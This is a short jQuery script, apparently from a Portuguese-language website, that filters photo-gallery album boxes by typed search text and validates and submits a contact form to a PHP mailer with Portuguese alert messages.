function SearchDivs(text)
{
 var foundTDs = $("#divContainer .searchGaleria:Contains('"+text+"')"); 
 
 $("#SearchResults").html("");
 if(foundTDs.length > 0){
  foundTDs.closest(".galeriaBox").clone().appendTo("#SearchResults");
 }else{
  $("#SearchResults").html("<div class='galeriaFloat'><span style='padding:5px;'>Nenhum álbum encontrado.</span></div>");
 }
}

function loadSearchGaleria()
{
  $("#txtSearch").keyup(function () {
    if($(this).val().length > 0)
    {
      SearchDivs($(this).val());
    }else{
      $("#SearchResults").html("");
    }
  });
  
  $("#btnLimpar").click(function () {
    $("#txtSearch").val("");
    $("#SearchResults").html("");
  });
}

function enviarMensagem(){

  if($("#txtNome").val() == ""){
    alert('O campo Nome é obrigatório!');
    return;
  }
  
  if($("#txtTelefone").val() == "" && $("#txtEmail").val() == ""){
    alert('Um telefone ou email é necessário para entrarmos em contato!');
    return;
  }
  
  if($("#txtMensagem").val() == ""){
    alert('O campo Mensagem é obrigatório!');
    return;
  }
  
  $.post('enviaEmail.php', {txtNome:$("#txtNome").val()
                            ,txtTelefone:$("#txtTelefone").val()
                            ,txtEmail:$("#txtEmail").val()
                            ,txtMotivo:$("#txtMotivo").val()
                            ,txtMensagem:$("#txtMensagem").val() }, function(data){
    if(data == "1")
      alert('Obrigado pelo seu contato. Retornaremos em breve!');
    else
      alert(data);
  });
    
  
}